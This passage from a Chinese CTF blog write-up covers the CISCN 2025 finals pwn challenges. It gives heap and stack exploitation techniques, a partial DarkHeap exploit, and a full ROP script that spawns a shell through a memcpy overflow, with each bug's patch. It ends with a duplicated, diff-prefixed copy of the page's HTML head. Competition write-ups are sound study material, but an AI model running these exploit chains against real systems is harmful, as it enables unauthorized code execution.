class="number">0xFFFFFFFF</span>)[:<span class="number">3</span>])</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x118</span>)</span><br><span class="line">edit(<span class="number">1</span>, p64(<span class="number">0</span>) * <span class="number">3</span> + p32((libc_base + get_current_one_gadget_from_libc()[<span class="number">4</span>]) &amp; <span class="number">0xFFFFFFFF</span>)[:<span class="number">3</span>])</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0xB8</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">ia()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h4 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h4><p>以下解法来自中大的师傅</p><p>由于程序是fork的，因此地址不会改变，可以采用逐位爆破</p><p>具体做法就是先申请，然后free到unsortbin，从地位开始改unsortbin里存的libc地址，如果改对了，程序不会爆错，改错了就会</p><p>重复即可爆破出完整libc地址</p><h4 id="Fix"><a href="#Fix" class="headerlink" title="Fix"></a>Fix</h4><p>把free后的chunk fd位清空即可</p><p>听说call exit也能过</p><p>（nop free也能利用成功也是神人了，逆天check脚本）</p><h3 id="Logging-System"><a href="#Logging-System" class="headerlink" title="Logging System"></a>Logging System</h3><p>拿到的是依托，先恢复一下符号</p><img lazyload src="/images/loading.svg" data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723140050539.png" title="image-20250723140050539"><p>程序先cin读入一个string</p><p>然后将string转成sstream，逐个字节读入数据</p><p>需要注意的是，程序要求输入base64</p><img lazyload src="/images/loading.svg" data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723140203000.png" title="image-20250723140203000"><p>这里是base64decode</p><p>校验1，首位必须是0xB9</p><img lazyload src="/images/loading.svg" data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723140233979.png" title="image-20250723140233979"><p>接着读入标志位</p><img lazyload src="/images/loading.svg" data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723140253615.png" title="image-20250723140253615"><p>标志位有0x80 0x81 0x82 0x83，这些标志位代表下一次读入是读入多少字节的数据</p><p>0x80 - 1</p><p>0x81 - 2</p><p>0x82 - 4</p><p>0x83 - 8</p><p>接着又是一个校验位，0xBD<img lazyload src="/images/loading.svg" data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723140439147.png" title="image-20250723140439147"></p><p>和上面一样，也是先读标志位，然后读入数据</p><p>不同的是，这里读入数据是作为下一次读入的数据长度，如图<code>v76</code></p><img lazyload src="/images/loading.svg" data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723140553808.png" title="image-20250723140553808"><p>同样的，下面重复一次<img lazyload src="/images/loading.svg" data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723140627319.png" title="image-20250723140627319"></p><p>最后读入校验码，同样是先读入标志位</p><img lazyload src="/images/loading.svg" data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723140737683.png" title="image-20250723140737683"><p>紧接着程序计算CRC校验值，需要我们最后一次读入的校验值和程序计算的一致</p><p>不需要自己计算，打断点动调即可获得校验值</p><img lazyload src="/images/loading.svg" data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723140903275.png" title="image-20250723140903275"><p>紧接着程序执行<code>memcpy</code>，这里存在栈溢出</p><img lazyload src="/images/loading.svg" data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723140928210.png" title="image-20250723140928210"><h4 id="Break"><a href="#Break" class="headerlink" title="Break"></a>Break</h4><p>简单的ROP，用ropper自动生成的</p><p>需要注意的是，程序在最后会调用sstream的析构函数，需要满足里面的一些条件判断，让程序不走到free，不然会崩溃</p><p>动调一下修改就行</p><img lazyload src="/images/loading.svg" data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723141106463.png" title="image-20250723141106463"> <img lazyload src="/images/loading.svg" data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723141125722.png" title="image-20250723141125722"> <img lazyload src="/images/loading.svg" data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723141137277.png" title="image-20250723141137277"><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;130&quot;</span>]</span><br><span class="line">local_flag = sys.argv[<span class="number">1</span>] <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">cmd = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b *0x405D15</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    b *0x405D50</span></span><br><span class="line"><span class="string">    b *0x405D9A</span></span><br><span class="line"><span class="string">    ida</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">gift.elf = ELF(elf_path := <span class="string">&#x27;./LoginSystem&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> local_flag == <span class="string">&quot;remote&quot;</span>:</span><br><span class="line">    addr = <span class="string">&#x27;39.96.183.124 20603&#x27;</span></span><br><span class="line">    ip, port = re.split(<span class="string">r&#x27;[\s:]+&#x27;</span>, addr)</span><br><span class="line">    gift.io = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    gift.io = process(elf_path)</span><br><span class="line">    <span class="comment"># gift.io = gdb.debug(elf_path, gdbscript=cmd, sysroot=&#x27;/&#x27;)</span></span><br><span class="line">gift.remote = local_flag <span class="keyword">in</span> (<span class="string">&quot;remote&quot;</span>, <span class="string">&quot;nodbg&quot;</span>)</span><br><span class="line">init_x64_context(gift.io, gift)</span><br><span class="line">libc = load_libc()</span><br><span class="line">launch_gdb(cmd)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&#x27;--&gt; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = p64</span><br><span class="line">IMAGE_BASE_0 = <span class="number">0x0000000000400000</span>  <span class="comment"># efa234332e5336c9d85b244c515b43af2c82417ea32f1f70f25663d3dfd566e3</span></span><br><span class="line">rebase_0 = <span class="keyword">lambda</span> x: p64(x + IMAGE_BASE_0)</span><br><span class="line"></span><br><span class="line">rop = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">rop += rebase_0(<span class="number">0x00000000000071B8</span>)  <span class="comment"># 0x00000000004071b8: pop r13; ret;</span></span><br><span class="line">rop += <span class="string">b&#x27;//bin/sh&#x27;</span></span><br><span class="line">rop += rebase_0(<span class="number">0x0000000000007150</span>)  <span class="comment"># 0x0000000000407150: pop rbx; ret;</span></span><br><span class="line">rop += rebase_0(<span class="number">0x000000000053E160</span>)</span><br><span class="line">rop += rebase_0(<span class="number">0x00000000003C2B42</span>)  <span class="comment"># 0x00000000007c2b42: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret;</span></span><br><span class="line">rop += p(<span class="number">0xDEADBEEFDEADBEEF</span>)</span><br><span class="line">rop += p(<span class="number">0xDEADBEEFDEADBEEF</span>)</span><br><span class="line">rop += p(<span class="number">0xDEADBEEFDEADBEEF</span>)</span><br><span class="line">rop += p(<span class="number">0xDEADBEEFDEADBEEF</span>)</span><br><span class="line">rop += rebase_0(<span class="number">0x00000000000071B8</span>)  <span class="comment"># 0x00000000004071b8: pop r13; ret;</span></span><br><span class="line">rop += p(<span class="number">0x0000000000000000</span>)</span><br><span class="line">rop += rebase_0(<span class="number">0x0000000000007150</span>)  <span class="comment"># 0x0000000000407150: pop rbx; ret;</span></span><br><span class="line">rop += rebase_0(<span class="number">0x000000000053E168</span>)</span><br><span class="line">rop += rebase_0(<span class="number">0x00000000003C2B42</span>)  <span class="comment"># 0x00000000007c2b42: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret;</span></span><br><span class="line">rop += p(<span class="number">0xDEADBEEFDEADBEEF</span>)</span><br><span class="line">rop += p(<span class="number">0xDEADBEEFDEADBEEF</span>)</span><br><span class="line">rop += p(<span class="number">0xDEADBEEFDEADBEEF</span>)</span><br><span class="line">rop += p(<span class="number">0xDEADBEEFDEADBEEF</span>)</span><br><span class="line">rop += rebase_0(<span class="number">0x0000000000005D99</span>)  <span class="comment"># 0x0000000000405d99: pop rdi; ret;</span></span><br><span class="line">rop += rebase_0(<span class="number">0x000000000053E160</span>)</span><br><span class="line">rop += rebase_0(<span class="number">0x00000000000079C4</span>)  <span class="comment"># 0x00000000004079c4: pop rsi; ret;</span></span><br><span class="line">rop += rebase_0(<span class="number">0x000000000053E168</span>)</span><br><span class="line">rop += rebase_0(<span class="number">0x0000000000128753</span>)  <span class="comment"># 0x0000000000528753: pop rdx; ret;</span></span><br><span class="line">rop += rebase_0(<span class="number">0x000000000053E168</span>)</span><br><span class="line">rop += rebase_0(<span class="number">0x0000000000009387</span>)  <span class="comment"># 0x0000000000409387: pop rax; ret;</span></span><br><span class="line">rop += p(<span class="number">0x000000000000003B</span>)</span><br><span class="line">rop += rebase_0(<span class="number">0x000000000030C546</span>)  <span class="comment"># 0x000000000070c546: syscall; ret;</span></span><br><span class="line"></span><br><span class="line">pay1 = flat(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0x150</span>: <span class="number">0x947FC0</span>,  <span class="comment"># 修改以不走free的分支</span></span><br><span class="line">        <span class="number">0x250</span>: <span class="number">0x947FC0</span>,  <span class="comment"># 修改以不走free的分支</span></span><br><span class="line">        <span class="number">0x7C8</span>: rop,</span><br><span class="line">    &#125;,</span><br><span class="line">    filler=<span class="string">b&#x27;\x00&#x27;</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;\xb9&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;\x80\x03&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;\xbd&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;\x80\x05&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;admin&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;\xbd&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;\x81&#x27;</span> + p16_ex(<span class="built_in">len</span>(pay1))</span><br><span class="line">payload += pay1</span><br><span class="line">payload += <span class="string">b&#x27;\x82&#x27;</span> + p64(<span class="number">0x633F1F27</span>)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sl(b64encode(payload))</span><br><span class="line"></span><br><span class="line">ia()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h4 id="Fix-1"><a href="#Fix-1" class="headerlink" title="Fix"></a>Fix</h4><p>将<code>memcpy</code>的len改成256即可</p><h3 id="embbed-httpd"><a href="#embbed-httpd" class="headerlink" title="embbed_httpd"></a>embbed_httpd</h3><h4 id="Fix-2"><a href="#Fix-2" class="headerlink" title="Fix"></a>Fix</h4><p>晚点补……</p></div><div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8"><div class="article-copyright-info-container"><ul><li><strong>标题:</strong> ciscn-2025-决赛</li><li><strong>作者:</strong> InkeyP</li><li><strong>创建于 :</strong> 2025-07-23 13:18:25</li><li><strong>更新于 :</strong> 2025-07-23 14:17:49</li><li><strong>链接:</strong> https://blog.inkey.top/202507/23/ciscn-2025-决赛/</li><li><strong>版权声明: </strong>本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。</li></ul></div></div><ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden"><li class="tag-item mx-0.5"><a href="/tags/pwn/">#pwn</a>&nbsp;</li><li class="tag-item mx-0.5"><a href="/tags/ciscn/">#ciscn</a>&nbsp;</li></ul><div class="recommended-article px-2 sm:px-6 md:px-8"><div class="recommended-desktop"><div class="recommended-article-header text-xl md:text-3xl font-bold mt-10"><i aria-hidden="true"></i><span>绝赞文章</span></div><div class="recommended-article-group"><a class="recommended-article-item" href="/202509/21/湾区杯-2025/" title="湾区杯-2025" rel="bookmark"><img src="/202509/21/湾区杯-2025/image-20250921130233837.png" alt="湾区杯-2025" class="!max-w-none"> <span class="title">湾区杯-2025</span> </a><a class="recommended-article-item" href="/202411/28/WangDing-2024/" title="WangDing-2024" rel="bookmark"><img src="/img/cover/12.png" alt="WangDing-2024" class="!max-w-none"> <span class="title">WangDing-2024</span> </a><a class="recommended-article-item" href="/202510/13/羊城杯-2025-初赛/" title="羊城杯-2025-初赛" rel="bookmark"><img src="/202510/13/羊城杯-2025-初赛/1.png" alt="羊城杯-2025-初赛" class="!max-w-none"> <span class="title">羊城杯-2025-初赛</span></a></div></div><div class="recommended-mobile"><div class="recommended-article-header text-xl md:text-3xl font-bold mt-10"><i aria-hidden="true"></i><span>绝赞文章</span></div><div class="recommended-article-group"><a class="recommended-article-item" href="/202509/21/湾区杯-2025/" title="湾区杯-2025" rel="bookmark"><img src="/202509/21/湾区杯-2025/image-20250921130233837.png" alt="湾区杯-2025" class="!max-w-none"> <span class="title">湾区杯-2025</span> </a><a class="recommended-article-item" href="/202411/28/WangDing-2024/" title="WangDing-2024" rel="bookmark"><img src="/img/cover/12.png" alt="WangDing-2024" class="!max-w-none"> <span class="title">WangDing-2024</span></a></div></div></div><div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8"><div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2"><a class="prev" rel="prev" href="/202508/15/dkdun/"><span class="left arrow-icon flex justify-center items-center"><i class="fa-solid fa-chevron-left"></i> </span><span class="title flex justify-center items-center"><span class="post-nav-title-item">DK盾-CTFers赞助计划已启动！</span> <span class="post-nav-item">上一篇</span></span></a></div><div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2"><a class="next" rel="next" href="/202503/17/ciscn-2025-%E5%8D%8A%E5%86%B3%E8%B5%9B/"><span class="title flex justify-center items-center"><span class="post-nav-title-item">ciscn-2025-半决赛</span> <span class="post-nav-item">下一篇</span> </span><span class="right arrow-icon flex justify-center items-center"><i class="fa-solid fa-chevron-right"></i></span></a></div></div><div class="comment-container px-2 sm:px-6 md:px-8 pb-8"><div class="comments-container mt-10 w-full"><div id="comment-anchor" class="w-full h-2.5"></div><div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">评论</div><div id="waline"></div><script type="module" data-swup-reload-script>import{init}from"/js/libs/waline.mjs";function loadWaline(){init({el:"#waline",serverURL:"https://blogcommit.inkey.top",lang:"zh-CN",dark:'body[class~="dark-mode"]',reaction:!1,requiredMeta:["nick","mail"],emoji:["https://unpkg.com/@waline/emojis@1.2.0/bilibili","https://unpkg.com/@waline/emojis@1.2.0/bmoji","https://unpkg.com/@waline/emojis@1.2.0/tw-emoji"]})}"undefined"!=typeof swup?loadWaline():window.addEventListener("DOMContentLoaded",loadWaline)</script></div></div></div><div class="toc-content-container"><div class="post-toc-wrap"><div class="post-toc"><div class="toc-title">目录</div><div class="page-title">ciscn-2025-决赛</div><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Ciscn-2025-%E5%86%B3%E8%B5%9B-PWN"><span class="nav-text">Ciscn 2025 决赛 PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Day-1"><span class="nav-text">Day 1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#mqtt"><span class="nav-text">mqtt</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Day-2"><span class="nav-text">Day 2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DarkHeap"><span class="nav-text">DarkHeap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Logging-System"><span class="nav-text">Logging System</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#embbed-httpd"><span class="nav-text">embbed_httpd</span></a></li></ol></li></ol></li></ol></div></div></div></div></div></div><div class="main-content-footer"><footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color"><div class="info-container py-3 text-center"><div class="customize-info my-1">梦想是成为PWN糕手</div><div class="text-center">&copy; <span>2024</span> - 2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration:0.5s;color:#f54545"></i>&nbsp;&nbsp;<a href="/">InkeyP</a><p class="post-count space-x-0.5"><span>共撰写了 22 篇文章 </span><span>共 41.7k 字</span></p></div><script data-swup-reload-script src="https://cn.vercount.one/js"></script><div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right"><span id="busuanzi_container_site_uv" class="lg:!block"><span class="text-sm">访问人数</span> <span id="busuanzi_value_site_uv"></span> </span><span id="busuanzi_container_site_pv" class="lg:!block"><span class="text-sm">总访问量</span> <span id="busuanzi_value_site_pv"></span></span></div><div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left"><span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span> <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.2</a></span></div><div>博客已运行 <span class="odometer" id="runtime_days"></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒</div><script data-swup-reload-script>try{function odometer_init(){document.querySelectorAll(".odometer").forEach(e=>{new Odometer({el:e,format:"( ddd).dd",duration:200})})}odometer_init()}catch(e){}</script></div></footer></div></div><div class="post-tools"><div class="post-tools-container"><ul class="article-tools-list"><li class="right-bottom-tools page-aside-toggle"><i class="fa-regular fa-outdent"></i></li><li class="go-comment"><i class="fa-regular fa-comments"></i></li></ul></div></div><div class="right-side-tools-container"><div class="side-tools-container"><ul class="hidden-tools-list"><li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center"><i class="fa-regular fa-magnifying-glass-plus"></i></li><li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center"><i class="fa-regular fa-magnifying-glass-minus"></i></li><li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center"><i class="fa-regular fa-moon"></i></li><li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center"><i class="fa-regular fa-arrow-down"></i></li></ul><ul class="visible-tools-list"><li class="right-bottom-tools toggle-tools-list flex justify-center items-center"><i class="fa-regular fa-cog fa-spin"></i></li><li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center"><i class="arrow-up fas fa-arrow-up"></i> <span class="percent"></span></li></ul></div></div><div class="image-viewer-container"><img src=""></div><div class="search-pop-overlay"><div class="popup search-popup"><div class="search-header"><span class="search-input-field-pre"><i class="fa-solid fa-keyboard"></i></span><div class="search-input-container"><input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="站内搜索您需要的内容..." spellcheck="false" type="search" class="search-input"></div><span class="popup-btn-close"><i class="fa-solid fa-times"></i></span></div><div id="search-result"><div id="no-result"><i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i></div></div></div></div></main><script src="/js/build/libs/Swup.min.js"></script><script src="/js/build/libs/SwupSlideTheme.min.js"></script><script src="/js/build/libs/SwupScriptsPlugin.min.js"></script><script src="/js/build/libs/SwupProgressPlugin.min.js"></script><script src="/js/build/libs/SwupScrollPlugin.min.js"></script><script src="/js/build/libs/SwupPreloadPlugin.min.js"></script><script>const swup=new Swup({plugins:[new SwupScriptsPlugin({optin:!0}),new SwupProgressPlugin,new SwupScrollPlugin({offset:80}),new SwupSlideTheme({mainElement:".main-content-body"}),new SwupPreloadPlugin],containers:["#swup"]})</script><script src="/js/build/tools/imageViewer.js" type="module"></script><script src="/js/build/utils.js" type="module"></script><script src="/js/build/main.js" type="module"></script><script src="/js/build/layouts/navbarShrink.js" type="module"></script><script src="/js/build/tools/scrollTopBottom.js" type="module"></script><script src="/js/build/tools/lightDarkSwitch.js" type="module"></script><script src="/js/build/layouts/categoryList.js" type="module"></script><script src="/js/build/tools/localSearch.js" type="module"></script><script src="/js/build/tools/codeBlock.js" type="module"></script><script src="/js/build/layouts/lazyload.js" type="module"></script><script src="/js/build/tools/runtime.js"></script><script src="/js/build/libs/odometer.min.js"></script><link rel="stylesheet" href="/assets/odometer-theme-minimal.css"><script src="/js/build/libs/Typed.min.js"></script><script src="/js/build/plugins/typed.js" type="module"></script><script src="/js/build/libs/anime.min.js"></script><script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script><script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script><script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script><script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script><script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script><script src="/js/build/libs/pangu.min.js"></script><script src="/js/build/plugins/pangu.js"></script><script data-pjax src="https://registry.npmmirror.com/oh-my-live2d/latest/files"></script><script>const oml2d=OML2D.loadOml2d({libraryUrls:{complete:"https://registry.npmmirror.com/oh-my-live2d/latest/files/lib/complete.js",cubism2:"https://registry.npmmirror.com/oh-my-live2d/latest/files/lib/cubism2.js",cubism5:"https://registry.npmmirror.com/oh-my-live2d/latest/files/lib/cubism5.js"},menus:{},items:"(defaultItems)=>{\n return [\n   ...defaultItems,\n   {\n     id: 'github',\n     icon: 'github-fill',\n     title: '点击直达gayhub',\n     onClick: ()=>window.open('https://github.com/inkeyp')\n   }\n ]\n}\n",mobileDisplay:!0,models:[{path:"live2d_models/poi/poi.model.json",mobilePosition:[-10,23],mobileScale:.1,mobileStageStyle:{width:180,height:166},motionPreloadStrategy:"IDLE",position:[10,40],scale:.4,stageStyle:{width:300,height:300}}],parentElement:document.body,primaryColor:"var(--btn-bg)",sayHello:!1,tips:{style:{width:230,height:120,left:"calc(50% - 20px)",top:"-100px"},mobileStyle:{width:180,height:80,left:"calc(50% - 30px)",top:"-100px"},idleTips:{interval:15e3,message:function(){return axios.get("https://v1.hitokoto.cn?c=i").then((function(t){return t.data.hitokoto})).catch((function(t){console.error(t)}))}}}})</script></body></html>
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="pwn">
+    
+    <meta name="author" content="InkeyP">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://blog.inkey.top/202507/23/ciscn-2025-决赛/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ciscn-2025-决赛">
+<meta property="og:url" content="https://blog.inkey.top/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/index.html">
+<meta property="og:site_name" content="InkeyPのblog">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.inkey.top/images/redefine-og.webp">
+<meta property="article:published_time" content="2025-07-23T05:18:25.000Z">
+<meta property="article:modified_time" content="2025-07-23T06:17:49.213Z">
+<meta property="article:author" content="InkeyP">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="ciscn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.inkey.top/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/img/icon.jpg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/img/icon.jpg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/img/icon.jpg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            ciscn-2025-决赛 | InkeyPのblog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+        
+            
+    
+            
+    
+            
+                
+                    <meta name="baidu-site-verification" content="codeva-vx7ZKBKYs0" />
+                
+    
+            
+                
+                    <link rel="stylesheet" href="/css/custom.css">
+                
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"blog.inkey.top","root":"/","language":"zh-CN","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":true,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":true,"recommendation":{"enable":true,"title":"绝赞文章","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"dark"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar